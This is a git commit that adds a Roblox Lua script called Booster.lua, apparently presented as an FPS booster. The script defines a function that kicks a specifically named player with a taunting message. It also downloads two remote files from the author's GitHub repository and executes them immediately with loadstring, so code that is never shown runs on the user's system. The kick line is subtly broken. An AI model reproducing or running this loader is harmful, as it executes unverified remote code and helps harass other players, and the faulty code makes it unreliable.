7daefe83283dd586574bc3ea96c4e7f0d6845ab3
Cold-Script <166982379+Cold-Script@users.noreply.github.com>
2024-07-11 11:09:09 +0700

    Create Booster.lua

---
+++ Booster.lua
@@ -0,0 +1,8 @@
+local repo = "https://raw.githubusercontent.com/Cold-Script/UpgradedFPS/main/"
+local rec = workspace.ripvenomhaki
+local adminrec = workspace.rechedmcvn
+function KickPlayer()
+game.rec:Kick("lol , Why are you angry?")
+end
+loadstring(game:HttpGet(repo .. "Remove.Loaded"))()
+loadstring(game:HttpGet(repo .. "FPS.Loaded"))()
